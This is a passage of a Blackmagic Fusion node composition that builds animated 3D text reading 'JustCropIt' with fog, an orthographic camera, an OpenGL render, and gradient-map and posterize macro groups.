					Source = ""Value"",
				},
				[""Translate.Z""] = Input { Value = -0.75, },
				SceneInput = Input {
					SourceOp = ""Text3D"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { 1430, 3349.5 } },
		},
		Duplicate3D1YOffset = BezierSpline {
			SplineColor = { Red = 252, Green = 57, Blue = 47 },
			CtrlWZoom = false,
			KeyFrames = {
				[0] = { 0, RH = { 15.1, 0 }, Flags = { Linear = true } },
				[78] = { -0.13, LH = { 5, -0.13 } }
			}
		},
		Merge3D1 = Merge3D {
			Inputs = {
				SceneInput1 = Input {
					SourceOp = ""Duplicate3D1"",
					Source = ""Data3D"",
				},
				SceneInput2 = Input {
					SourceOp = ""Instance_Duplicate3D1"",
					Source = ""Data3D"",
				},
				SceneInput3 = Input {
					SourceOp = ""Camera3D1"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { 1485, 3415.5 } },
		},
		Text3D = Text3D {
			NameSet = true,
			Inputs = {
				LayoutRotation = Input { Value = 1, },
				TransformRotation = Input { Value = 1, },
				StyledText = Input { Value = ""JustCropIt"", },
				Font = Input { Value = ""Helvetica Neue"", },
				Style = Input { Value = ""Bold"", },
				Size = Input { Value = 0.32, },
				VerticalJustification = Input { Value = 3, },
				VerticalJustificationNew = Input { Value = 3, },
				HorizontalJustificationNew = Input { Value = 3, },
				ExtrusionProfile = Input {
					SourceOp = ""Text3DExtrusionProfile"",
					Source = ""Value"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { 1485, 3283.5 } },
		},
		Text3DExtrusionProfile = LUTBezier {
			KeyColorSplines = {
				[0] = {
					[0] = { 0, RH = { 0.0666666666666667, 0.333333333333333 }, Flags = { Linear = true } },
					[0.2] = { 1, LH = { 0.133333333333333, 0.666666666666667 }, RH = { 0.4, 1 }, Flags = { Linear = true } },
					[0.8] = { 1, LH = { 0.6, 1 }, RH = { 0.866666666666667, 0.666666666666667 }, Flags = { Linear = true } },
					[1] = { 0, LH = { 0.933333333333333, 0.333333333333333 }, Flags = { Linear = true } }
				}
			},
			SplineColor = { Red = 192, Green = 128, Blue = 64 },
			CtrlWZoom = false,
		},
		Instance_Duplicate3D1 = Duplicate3D {
			SourceOp = ""Duplicate3D1"",
			Inputs = {
				Translation = Input { },
				[""Translate.Y""] = Input {
					Value = 0.118859126706157,
					Expression = ""-Duplicate3D1.Translate.Y""
				},
				Rotation = Input { Value = 0, },
				PivotNest = Input { },
				ScaleNest = Input { },
				Randomize = Input { },
				TranslationJitter = Input { },
				RotationJitter = Input { },
				PivotJitterNest = Input { },
				ScaleJitterNest = Input { },
				RegionNest = Input { },
				SceneInput = Input {
					SourceOp = ""Text3D"",
					Source = ""Output"",
				},
				CommentsNest = Input { },
				FrameRenderScriptNest = Input { },
				StartRenderScripts = Input { },
				EndRenderScripts = Input { },
			},
			ViewInfo = OperatorInfo { Pos = { 1540, 3349.5 } },
		},
		Fog3D1 = Fog3D {
			Inputs = {
				SceneInput = Input {
					SourceOp = ""Merge3D1"",
					Source = ""Output"",
				},
				ShowFogInView = Input { Value = 1, },
				FogRed = Input { Value = 0, },
				FogGreen = Input { Value = 0, },
				FogBlue = Input { Value = 0, },
				NearFogDist = Input { Value = 1.6, },
				FarFogDistance = Input { Value = 9.68, },
			},
			ViewInfo = OperatorInfo { Pos = { 1485, 3481.5 } },
		},
		Camera3D1 = Camera3D {
			Inputs = {
				[""Transform3DOp.Translate.Z""] = Input { Value = 2.1, },
				ProjectionType = Input { Value = FuID { ""Orthographic"" }, },
				OrthoFarClip = Input { Value = 170, },
				AoV = Input { Value = 19.2642683071402, },
				[""Stereo.Mode""] = Input { Value = FuID { ""OffAxis"" }, },
				FilmGate = Input { Value = FuID { ""BMD_URSA_4K_16x9"" }, },
				ApertureW = Input { Value = 0.831496062992126, },
				ApertureH = Input { Value = 0.467716535433071, },
				ViewingVolumeSize = Input { Value = 0.732, },
				[""SurfacePlaneInputs.ObjectID.ObjectID""] = Input { Value = 1, },
				[""MtlStdInputs.MaterialID""] = Input { Value = 1, },
			},
			ViewInfo = OperatorInfo { Pos = { 1595, 3415.5 } },
		},
		Renderer3D2_2 = Renderer3D {
			CustomData = { ToolVersion = 2, },
			Inputs = {
				[""RendererSoftware.Channels.Nest""] = Input { Value = 1, },
				Quality = Input { Value = 5, },
				GlobalOut = Input { Value = 78, },
				Width = Input { Value = 1080, },
				Height = Input { Value = 2160, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				SceneInput = Input {
					SourceOp = ""Fog3D1"",
					Source = ""Output"",
				},
				RendererType = Input { Value = FuID { ""RendererOpenGL"" }, },
				[""RendererOpenGL.AntiAliasing.Nest""] = Input { Value = 1, },
				[""RendererOpenGL.AntiAliasing.Channels.SelectedChannel""] = Input { Value = FuID { ""Vector"" }, },
				[""RendererOpenGL.AntiAliasing.Channels.RGBA.LowQuality.Enable""] = Input { Value = 0, },
				[""RendererOpenGL.AntiAliasing.Channels.RGBA.HighQuality.Enable""] = Input { Value = 0, },
				[""RendererOpenGL.AntiAliasing.Presets.Color.Supersampling.HighQuality.Rate""] = Input { Value = 3, },
				[""RendererOpenGL.AntiAliasing.Presets.Color.Multisampling.LowQuality.SampleCount""] = Input { Value = 2, },
				[""RendererOpenGL.AntiAliasing.Presets.Color.Multisampling.HighQuality.SampleCount""] = Input { Value = 3, },
				[""RendererOpenGL.AntiAliasing.Presets.Aux.Supersampling.HighQuality.Rate""] = Input { Value = 3, },
				[""RendererOpenGL.AntiAliasing.Presets.Aux.Multisampling.LowQuality.SampleCount""] = Input { Value = 2, },
				[""RendererOpenGL.AntiAliasing.Presets.Aux.Multisampling.HighQuality.SampleCount""] = Input { Value = 3, },
				[""RendererOpenGL.AccumQuality""] = Input { Value = 32, },
				[""RendererOpenGL.MaximumTextureDepth""] = Input { Value = 4, },
			},
			ViewInfo = OperatorInfo { Pos = { 1485, 3547.5 } },
			SubInputsData = {
				RendererOpenGL = {
					Version = 1
				}
			}
		},
		BrightnessContrast1_34 = BrightnessContrast {
			Inputs = {
				ApplyMaskInverted = Input { Value = 1, },
				Low = Input { Value = 0.11465, },
				High = Input { Value = 0.93011, },
				ClipBlack = Input { Value = 1, },
				ClipWhite = Input { Value = 1, },
				PreDividePostMultiply = Input { Value = 1, },
				Input = Input {
					SourceOp = ""Renderer3D2_2"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { 1485, 3613.5 } },
		},
		GradientMapIt_3 = MacroOperator {
			CustomData = {
				Settings = {
				},
				Path = {
					Map = {
						[""Setting:""] = ""Macros:/""
					}
				}
			},
			Inputs = ordered() {
				Input = InstanceInput {
					SourceOp = ""GM_PR_3"",
					Source = ""Input"",
				},
				InputNest = InstanceInput {
					SourceOp = ""GM_BM_3"",
					Source = ""InputNest"",
					Width = 1,
				},
				Invert = InstanceInput {
					SourceOp = ""GM_BM_3"",
					Source = ""Invert"",
					Width = 1,
				},
				Input2 = InstanceInput {
					SourceOp = ""GM_BM_3"",
					Source = ""MaskSeparator"",
				},
				Channel = InstanceInput {
					SourceOp = ""GM_BM_3"",
					Source = ""Channel"",
				},
				Low = InstanceInput {
					SourceOp = ""GM_BM_3"",
					Source = ""Low"",
					ControlGroup = 5,
					Default = 0,
				},
				High = InstanceInput {
					SourceOp = ""GM_BM_3"",
					Source = ""High"",
					ControlGroup = 5,
					Default = 1,
				},
				GradientNest = InstanceInput {
					SourceOp = ""GM_BM_3"",
					Source = ""GradientNest"",
					Name = ""Gradient"",
					Width = 1,
				},
				GradientType = InstanceInput {
					SourceOp = ""GM_FN_3"",
					Source = ""GradientType"",
				},
				Start = InstanceInput {
					SourceOp = ""GM_FN_3"",
					Source = ""Start"",
					DefaultX = 0,
					DefaultY = 0.5,
				},
				End = InstanceInput {
					SourceOp = ""GM_FN_3"",
					Source = ""End"",
					DefaultX = 1,
					DefaultY = 0.5,
				},
				Gradient = InstanceInput {
					SourceOp = ""GM_FN_3"",
					Source = ""Gradient"",
				},
				GradientInterpolationMethod = InstanceInput {
					SourceOp = ""GM_FN_3"",
					Source = ""GradientInterpolationMethod"",
				},
				Offset = InstanceInput {
					SourceOp = ""GM_BM_3"",
					Source = ""Offset"",
					Page = ""Controls"",
					Default = 0,
				},
				Repeat = InstanceInput {
					SourceOp = ""GM_FN_3"",
					Source = ""Repeat"",
					Default = 0,
				},
				CompositeNest = InstanceInput {
					SourceOp = ""GM_BM_3"",
					Source = ""CompositeNest"",
					Name = ""Composite and Mask Settings"",
					Width = 1,
				},
				ApplyBlank2 = InstanceInput {
					SourceOp = ""GM_Mask_3"",
					Source = ""ApplyBlank1"",
				},
				ApplyMode = InstanceInput {
					SourceOp = ""GM_Mask_3"",
					Source = ""ApplyMode"",
				},
				Blend = InstanceInput {
					SourceOp = ""GM_Mask_3"",
					Source = ""Blend"",
					Default = 1,
				},
				Blank3 = InstanceInput {
					SourceOp = ""GM_Mask_3"",
					Source = ""Blank1"",
				},
				ApplyMaskInverted = InstanceInput {
					SourceOp = ""GM_Mask_3"",
					Source = ""ApplyMaskInverted"",
					Default = 0,
				},
				MultiplyByMask = InstanceInput {
					SourceOp = ""GM_Mask_3"",
					Source = ""MultiplyByMask"",
					Default = 0,
				},
				FitMask = InstanceInput {
					SourceOp = ""GM_Mask_3"",
					Source = ""FitMask"",
				},
				Blank4 = InstanceInput {
					SourceOp = ""GM_Mask_3"",
					Source = ""Blank2"",
				},
				MaskChannel = InstanceInput {
					SourceOp = ""GM_Mask_3"",
					Source = ""MaskChannel"",
					Default = 3,
				},
				MaskLow = InstanceInput {
					SourceOp = ""GM_Mask_3"",
					Source = ""MaskLow"",
					ControlGroup = 25,
					Default = 0,
				},
				MaskHigh = InstanceInput {
					SourceOp = ""GM_Mask_3"",
					Source = ""MaskHigh"",
					ControlGroup = 25,
					Default = 1,
				},
				MaskClipBlack = InstanceInput {
					SourceOp = ""GM_Mask_3"",
					Source = ""MaskClipBlack"",
					Name = ""Black"",
					Width = 0.5,
					Default = 1,
				},
				MaskClipWhite = InstanceInput {
					SourceOp = ""GM_Mask_3"",
					Source = ""MaskClipWhite"",
					Name = ""White"",
					Width = 0.5,
					Default = 1,
				},
				EffectMask = InstanceInput {
					SourceOp = ""GM_Mask_3"",
					Source = ""EffectMask"",
				}
			},
			Outputs = {
				MainOutput1 = InstanceOutput {
					SourceOp = ""GM_Mask_3"",
					Source = ""Output"",
				}
			},
			ViewInfo = GroupInfo { Pos = { 1595, 3646.5 } },
			Tools = ordered() {
				GM_PR_3 = PipeRouter {
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Input = Input {
							SourceOp = ""BrightnessContrast1_34"",
							Source = ""Output"",
						},
					},
					ViewInfo = PipeRouterInfo { Pos = { -55, 7.25736 } },
				},
				GM_BM_3 = BitmapMask {
					CtrlWZoom = false,
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
						MaskWidth = Input { Value = 1080, },
						MaskHeight = Input { Value = 1080, },
						PixelAspect = Input { Value = { 1, 1 }, },
						UseFrameFormatSettings = Input { Value = 1, },
						ClippingMode = Input { Value = FuID { ""None"" }, },
						Image = Input {
							SourceOp = ""GM_PR_3"",
							Source = ""Output"",
						},
						Channel = Input { Value = FuID { ""Luminance"" }, },
					},
					ViewInfo = OperatorInfo { Pos = { 55, 40.2574 } },
					UserControls = ordered() {
						Offset = {
							LINKS_Name = ""Offset"",
							INP_Integer = false,
							LINKID_DataType = ""Number"",
							ICS_ControlPage = ""Controls"",
							INPID_InputControl = ""ScrewControl"",
							INP_MinScale = -0.5,
							INP_MaxScale = 0.5,
							INP_Default = 0,
						},
						InputNest = {
							LBLC_DropDownButton = true,
							INPID_InputControl = ""LabelControl"",
							LBLC_NumInputs = 5,
							IC_ControlPage = 0,
							LINKS_Name = ""Input Settings"",
							INP_Default = 0,
						},
						GradientNest = {
							LBLC_DropDownButton = true,
							INPID_InputControl = ""LabelControl"",
							LBLC_NumInputs = 7,
							IC_ControlPage = 0,
							LINKS_Name = ""Gradient Settings"",
							INP_Default = 1,
						},
						CompositeNest = {
							LBLC_DropDownButton = true,
							INPID_InputControl = ""LabelControl"",
							LBLC_NumInputs = 13,
							IC_ControlPage = 0,
							LINKS_Name = ""Composite Settings"",
							INP_Default = 0,
						},
						MaskNest = {
							LBLC_DropDownButton = true,
							INPID_InputControl = ""LabelControl"",
							LBLC_NumInputs = 5,
							IC_ControlPage = 0,
							LINKS_Name = ""Mask Settings"",
							INP_Default = 0,
						}
					}
				},
				GM_FN_3 = FastNoise {
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						GlobalOut = Input { Value = 78, },
						Width = Input {
							Value = 1080,
							Expression = ""GM_BM_3.Image.OriginalWidth"",
						},
						Height = Input {
							Value = 2160,
							Expression = ""GM_BM_3.Image.OriginalHeight"",
						},
						[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
						Detail = Input { Value = 0, },
						Brightness = Input { Value = 1, },
						Type = Input { Value = 1, },
						Color1Alpha = Input { Value = 1, },
						Gradient = Input {
							Value = Gradient {
								Colors = {
									[0] = { 0, 0, 0, 1 },
									[0.0885608856088561] = { 1, 1, 1, 1 },
									[0.317343173431734] = { 0, 0, 0, 1 },
									[0.402214022140221] = { 1, 1, 1, 1 },
									[0.660516605166052] = { 0, 0, 0, 1 },
									[0.745387453874539] = { 1, 1, 1, 1 },
									[0.992619926199262] = { 0, 0, 0, 1 }
								}
							},
						},
						Offset = Input {
							Value = 0.5,
							Expression = ""GM_BM_3.Offset+0.5"",
						},
						NoiseBrightnessMap = Input {
							SourceOp = ""GM_BM_3"",
							Source = ""Mask"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 55, 73.2574 } },
				},
				GM_Mask_3 = Merge {
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Background = Input {
							SourceOp = ""GM_PR_3"",
							Source = ""Output"",
						},
						Foreground = Input {
							SourceOp = ""GM_FN_3"",
							Source = ""Output"",
						},
						PerformDepthMerge = Input { Value = 0, },
					},
					ViewInfo = OperatorInfo { Pos = { 55, 106.258 } },
				}
			},
			Colors = { TileColor = { R = 0.584313725490196, G = 0.294117647058824, B = 0.803921568627451 }, }
		},
		PosterizeIt_1 = MacroOperator {
			CustomData = {
				Path = {
					Map = {
						[""Setting:""] = ""Macros:/""
					}
				},
			},
			Inputs = ordered() {
				Input = InstanceInput {
					SourceOp = ""PipeRouter1_1"",
					Source = ""Input"",
				},
				Steps = InstanceInput {
					SourceOp = ""CT_Posterize_1"",
					Source = ""NumberIn2"",
					Page = ""Controls"",
					Default = 3,
				},
				Offset = InstanceInput {
					SourceOp = ""CT_Posterize_1"",
					Source = ""NumberIn3"",
					Page = ""Controls"",
				},
				ApplyBlank1 = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""ApplyBlank1"",
				},
				Smoothness = InstanceInput {
					SourceOp = ""CT_Posterize_1"",
					Source = ""Smoothness"",
					Page = ""Controls"",
					Default = 0,
				},
				ApplyBlank2 = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""ApplyBlank1"",
				},
				Greyscale = InstanceInput {
					SourceOp = ""CT_Posterize_1"",
					Source = ""Greyscale"",
					Page = ""Controls"",
					Default = 1,
				},
				ApplyBlank3 = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""ApplyBlank1"",
				},
				NeatControlNest = InstanceInput {
					SourceOp = ""CT_Posterize_1"",
					Source = ""NeatControlNest"",
					Expression = ""1-Greyscale"",
					Name = ""Name"",
					Page = ""Controls"",
				},
				ColorMix = InstanceInput {
					SourceOp = ""CT_Posterize_1"",
					Source = ""ColorMix"",
					Page = ""Controls"",
					Default = 1,
				},
				ApplyBlank4 = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""ApplyBlank1"",
				},
				Blank0 = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""Blank1"",
				},
				Blend = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""Blend"",
					Default = 1,
				},
				Blank1 = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""Blank1"",
				},
				ApplyMaskInverted = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""ApplyMaskInverted"",
					Default = 0,
				},
				MultiplyByMask = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""MultiplyByMask"",
					Default = 0,
				},
				FitMask = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""FitMask"",
				},
				Blank2 = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""Blank2"",
				},
				MaskChannel = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""MaskChannel"",
					Default = 3,
				},
				MaskLow = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""MaskLow"",
					ControlGroup = 16,
					Default = 0,
				},
				MaskHigh = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""MaskHigh"",
					ControlGroup = 16,
					Default = 1,
				},
				MaskClipBlack = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""MaskClipBlack"",
					Name = ""Black"",
					Width = 0.5,
					Default = 1,
				},
				MaskClipWhite = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""MaskClipWhite"",
					Name = ""White"",
					Width = 0.5,
					Default = 1,
				},
				EffectMask = InstanceInput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""EffectMask"",
				}
			},
			Outputs = {
				MainOutput1 = InstanceOutput {
					SourceOp = ""Mrg_Mask_1"",
					Source = ""Output"",
				}
			},
			ViewInfo = GroupInfo { Pos = { 1595, 3712.5 } },
			Tools = ordered() {
				PipeRouter1_1 = PipeRouter {
					CtrlWShown = false,
					Inputs = {
						Input = Input {
							SourceOp = ""GM_Mask_3"",
							Source = ""Output"",
						},
					},
					ViewInfo = PipeRouterInfo { Pos = { 0, 7.75726 } },
				},
				Saturation_1 = BrightnessContrast {
					CtrlWZoom = false,
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Saturation = Input {
							Value = 0,
							Expression = ""1-CT_Posterize_1.Greyscale"",
						},
						Input = Input {
							SourceOp = ""PipeRouter1_1"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { -55, 73.7573 } },
				},
				Blur_Smoothness_1 = Blur {
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Filter = Input { Value = FuID { ""Gaussian"" }, },
						XBlurSize = Input {
							Value = 0,
							Expression = ""CT_Posterize_1.Smoothness"",
						},
						Input = Input {
							SourceOp = ""Saturation_1"",
							Source = ""Output"",
						},
					},
					ViewInfo = OperatorInfo { Pos = { 55, 73.7573 } },
				},
				CT_Posterize_1 = Custom {
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						NumberIn1 = Input {
							Value = 3,
							Expression = ""NumberIn2+NumberIn3 <= 1 and 1.0001 or NumberIn2+NumberIn3"",
						},
						LUTIn1 = Input {
							SourceOp = ""CT_PosterizeLUTIn1_1"",
							Source = ""Value"",
						},
						LUTIn2 = Input {
							SourceOp = ""CT_PosterizeLUTIn2_1"",
							Source = ""Value"",
						},
						LUTIn3 = Input {
							SourceOp = ""CT_PosterizeLUTIn3_1"",
							Source = ""Value"",
						},
						LUTIn4 = Input {
							SourceOp = ""CT_PosterizeLUTIn4_1"",
							Source = ""Value"",
						},
						Setup1 = Input { Value = ""1/n1"", },
						RedExpression = Input { Value = ""(ceil(r1*n1)*s1 - s1) * (1/ (1-s1))"", },
						GreenExpression = Input { Value = ""(ceil(g1*n1)*s1 - s1) * (1/ (1-s1))"", },
						BlueExpression = Input { Value = ""(ceil(b1*n1)*s1 - s1) * (1/ (1-s1))"", },
						AlphaExpression = Input { Value = ""(ceil(a1*n1)*s1 - s1) * (1/ (1-s1))"", },
						NumberControls = Input { Value = 1, },
						NameforNumber1 = Input { Value = ""Posterization"", },
						NameforNumber2 = Input { Value = ""Steps"", },
						NameforNumber3 = Input { Value = ""Offset"", },
						ShowNumber4 = Input { Value = 0, },
						ShowNumber5 = Input { Value = 0, },
						ShowNumber6 = Input { Value = 0, },
						ShowNumber7 = Input { Value = 0, },
						ShowNumber8 = Input { Value = 0, },
						ShowPoint1 = Input { Value = 0, },
						ShowPoint2 = Input { Value = 0, },
						ShowPoint3 = Input { Value = 0, },
						ShowPoint4 = Input { Value = 0, },
						ShowLUT1 = Input { Value = 0, },
						ShowLUT2 = Input { Value = 0, },
						ShowLUT3 = Input { Value = 0, },
						ShowLUT4 = Input { Value = 0, },
						Image1 = Input {
							SourceOp = ""Blur_Smoothness_1"",
							Source = ""Output"",
						},
						NumberIn2 = Input { Value = 3, },
						NeatControlNest = Input {
							Value = 0,
							Expression = ""1-Greyscale"",
						},
						ColorMix = Input { Value = 1, },
					},
					ViewInfo = OperatorInfo { Pos = { -55, 139.758 } },
					UserControls = ordered() {
						NumberIn2 = {
							INP_MaxAllowed = 1000000,
							INP_Integer = true,
							INPID_InputControl = ""SliderControl"",
							INP_MaxScale = 32,
							INP_Default = 2,
							INP_MinScale = 2,
							INP_MinAllowed = 2,
							LINKID_DataType = ""Number"",
							ICS_ControlPage = ""Controls"",
							LINKS_Name = ""Steps""
						},
						NumberIn3 = {
							INP_MaxAllowed = 1000000,
							INP_Integer = false,
							INPID_InputControl = ""ScrewControl"",
							INP_MaxScale = 1,
							INP_MinScale = 0,
							INP_MinAllowed = -1000000,
							LINKID_DataType = ""Number"",
							ICS_ControlPage = ""Controls"",
							LINKS_Name = ""Offset""
						},
						Smoothness = {
							INP_MaxAllowed = 1000000,
							INP_Integer = false,
							INPID_InputControl = ""SliderControl"",
							INP_MaxScale = 100,
							INP_Default = 0,
							INP_MinScale = 0,
							INP_MinAllowed = 0,
							LINKID_DataType = ""Number"",
							ICS_ControlPage = ""Controls"",
							LINKS_Name = ""Smoothness""
						},
						Greyscale = {
							INP_MaxAllowed = 1,
							INP_Integer = true,
							INPID_InputControl = ""CheckboxControl"",
							INP_MaxScale = 1,
							INP_Default = 1,
							INP_MinScale = 0,
							INP_MinAllowed = 0,
							LINKID_DataType = ""Number"",
							ICS_ControlPage = ""Controls"",
							CBC_TriState = false,
							LINKS_Name = ""Greyscale""
						},
						NeatControlNest = {
							LINKS_Name = ""Neat Control Nest"",
							LBLC_DropDownButton = true,
							INPID_InputControl = ""LabelControl"",
							LBLC_NumInputs = 2,
							IC_ControlPage = 0,
							IC_Visible = false,
							INP_Default = 1,
						},
						ColorMix = {
							INP_MaxAllowed = 1,
							INP_Integer = false,
							INPID_InputControl = ""SliderControl"",
							INP_MaxScale = 1,
							INP_Default = 0,
							INP_MinScale = 0,
							INP_MinAllowed = 0,
							LINKID_DataType = ""Number"",
							ICS_ControlPage = ""Controls"",
							LINKS_Name = ""Color Mix""
						}
					}
				},
				CT_PosterizeLUTIn1_1 = LUTBezier {
					KeyColorSplines = {
						[0] = {
							[0] = { 0, RH = { 0.333333333333333, 0.333333333333333 }, Flags = { Linear = true } },
							[1] = { 1, LH = { 0.666666666666667, 0.666666666666667 }, Flags = { Linear = true } }
						}
					},
					SplineColor = { Red = 204, Green = 0, Blue = 0 },
					CtrlWZoom = false,
				},
				CT_PosterizeLUTIn2_1 = LUTBezier {
					KeyColorSplines = {
						[0] = {
							[0] = { 0, RH = { 0.333333333333333, 0.333333333333333 }, Flags = { Linear = true } },
							[1] = { 1, LH = { 0.666666666666667, 0.666666666666667 }, Flags = { Linear = true } }
						}
					},
					SplineColor = { Red = 0, Green = 204, Blue = 0 },
					CtrlWZoom = false,
				},
				CT_PosterizeLUTIn3_1 = LUTBezier {
					KeyColorSplines = {
						[0] = {
							[0] = { 0, RH = { 0.333333333333333, 0.333333333333333 }, Flags = { Linear = true } },
							[1] = { 1, LH = { 0.666666666666667, 0.666666666666667 }, Flags = { Linear = true } }
						}
					},
					SplineColor = { Red = 0, Green = 0, Blue = 204 },
					CtrlWZoom = false,
				},
				CT_PosterizeLUTIn4_1 = LUTBezier {
					KeyColorSplines = {
						[0] = {
							[0] = { 0, RH = { 0.333333333333333, 0.333333333333333 }, Flags = { Linear = true } },
							[1] = { 1, LH = { 0.666666666666667, 0.666666666666667 }, Flags = { Linear = true } }
						}
					},
					SplineColor = { Red = 204, Green = 204, Blue = 204 },
					CtrlWZoom = false,
				},
				Mrg_ColorMix_1 = Merge {
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Blend = Input { Expression = ""CT_Posterize_1.ColorMix"", },
						Background = Input {
							SourceOp = ""CT_Posterize_1"",
							Source = ""Output"",
						},
						Foreground = Input {
							SourceOp = ""Blur_Smoothness_1"",
							Source = ""Output"",
						},
						ApplyMode = Input { Value = FuID { ""Color"" }, },
						PerformDepthMerge = Input { Value = 0, },
						CommentsNest = Input { Value = 0, },
						FrameRenderScriptNest = Input { Value = 0, },
					},
					ViewInfo = OperatorInfo { Pos = { 55, 139.758 } },
				},
				Mrg_Mask_1 = Merge {
					CtrlWZoom = false,
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Background = Input {
							SourceOp = ""PipeRouter1_1"",
							Source = ""Output"",
						},
						Foreground = Input {
							SourceOp = ""Mrg_ColorMix_1"",
							Source = ""Output"",
						},
						PerformDepthMerge = Input { Value = 0, },
					},
					ViewInfo = OperatorInfo { Pos = { 0, 205.758 } },
				}
			},
		},
		GradientMapIt_4 = MacroOperator {
			CustomData = { Path = { Map = { [""Setting:""] = ""Macros:/"" } }, Settings = {
				} },
			Inputs = ordered() {
				Input = InstanceInput {
					SourceOp = ""GM_PR_4"",
					Source = ""Input"",
				},
				InputNest = InstanceInput {
					SourceOp = ""GM_BM_4"",
					Source = ""InputNest"",
					Width = 1,
				},
				Invert = InstanceInput {
					SourceOp = ""GM_BM_4"",
					Source = ""Invert"",
					Width = 1,
				},
				Input2 = InstanceInput {
					SourceOp = ""GM_BM_4"",
					Source = ""MaskSeparator"",
				},
				Channel = InstanceInput {
					SourceOp = ""GM_BM_4"",
					Source = ""Channel"",
				},
				Low = InstanceInput {
					SourceOp = ""GM_BM_4"",
					Source = ""Low"",
					ControlGroup = 5,
					Default = 0,
				},
				High = InstanceInput {
					SourceOp = ""GM_BM_4"",
					Source = ""High"",
					ControlGroup = 5,
					Default = 1,
				},
				GradientNest = InstanceInput {
					SourceOp = ""GM_BM_4"",
					Source = ""GradientNest"",
					Name = ""Gradient"",
					Width = 1,
				},
				GradientType = InstanceInput {
					SourceOp = ""GM_FN_4"",
					Source = ""GradientType"",
				},
				Start = InstanceInput {
					SourceOp = ""GM_FN_4"",
					Source = ""Start"",
					DefaultX = 0,
					DefaultY = 0.5,
				},
				End = InstanceInput {
					SourceOp = ""GM_FN_4"",
					Source = ""End"",
					DefaultX = 1,
					DefaultY = 0.5,
				},
				Gradient = InstanceInput {
					SourceOp = ""GM_FN_4"",
					Source = ""Gradient"",
				},
				GradientInterpolationMethod = InstanceInput {
					SourceOp = ""GM_FN_4"",
					Source = ""GradientInterpolationMethod"",
				},
				Offset = InstanceInput {
					SourceOp = ""GM_BM_4"",
					Source = ""Offset"",
					Page = ""Controls"",
					Default = 0,
				},
				Repeat = InstanceInput {
					SourceOp = ""GM_FN_4"",
					Source = ""Repeat"",
					Default = 0,
				},
				CompositeNest = InstanceInput {
					SourceOp = ""GM_BM_4"",
					Source = ""CompositeNest"",
					Name = ""Composite and Mask Settings"",
					Width = 1,
				},
				ApplyBlank2 = InstanceInput {
					SourceOp = ""GM_Mask_4"",
					Source = ""ApplyBlank1"",
				},
				ApplyMode = InstanceInput {
					SourceOp = ""GM_Mask_4"",
					Source = ""ApplyMode"",
				},
				Blend = InstanceInput {
					SourceOp = ""GM_Mask_4"",
					Source = ""Blend"",
					Default = 1,
				},
				Blank3 = InstanceInput {
					SourceOp = ""GM_Mask_4"",
					Source = ""Blank1"",
				},
				ApplyMaskInverted = InstanceInput {
					SourceOp = ""GM_Mask_4"",
					Source = ""ApplyMaskInverted"",
					Default = 0,
				},
				MultiplyByMask = InstanceInput {
					SourceOp = ""GM_Mask_4"",
					Source = ""MultiplyByMask"",
					Default = 0,
				},
				FitMask = InstanceInput {
					SourceOp = ""GM_Mask_4"",
					Source = ""FitMask"",
				},
				Blank4 = InstanceInput {
					SourceOp = ""GM_Mask_4"",
					Source = ""Blank2"",
				},
				MaskChannel = InstanceInput {
					SourceOp = ""GM_Mask_4"",
					Source = ""MaskChannel"",
					Default = 3,
				},
				MaskLow = InstanceInput {
					SourceOp = ""GM_Mask_4"",
					Source = ""MaskLow"",
					ControlGroup = 25,
					Default = 0,
				},
				MaskHigh = InstanceInput {
					SourceOp = ""GM_Mask_4"",
					Source = ""MaskHigh"",
					ControlGroup = 25,
					Default = 1,
				},
				MaskClipBlack = InstanceInput {
					SourceOp = ""GM_Mask_4"",
					Source = ""MaskClipBlack"",
					Name = ""Black"",
					Width = 0.5,
					Default = 1,
				},
				MaskClipWhite = InstanceInput {
					SourceOp = ""GM_Mask_4"",
					Source = ""MaskClipWhite"",
					Name = ""White"",
					Width = 0.5,
					Default = 1,
				},
				EffectMask = InstanceInput {
					SourceOp = ""GM_Mask_4"",
					Source = ""EffectMask"",
				}
			},
			Outputs = {
				MainOutput1 = InstanceOutput {
					SourceOp = ""GM_Mask_4"",
					Source = ""Output"",
				}
			},
			ViewInfo = GroupInfo { Pos = { 1485, 3745.5 } },
			Tools = ordered() {
				GM_PR_4 = PipeRouter {
					CtrlWShown = false,
					NameSet = true,
					Inputs = {
						Input = Input {
							SourceOp = ""Mrg_Mask_1"",
							Source = ""Output"",
						},
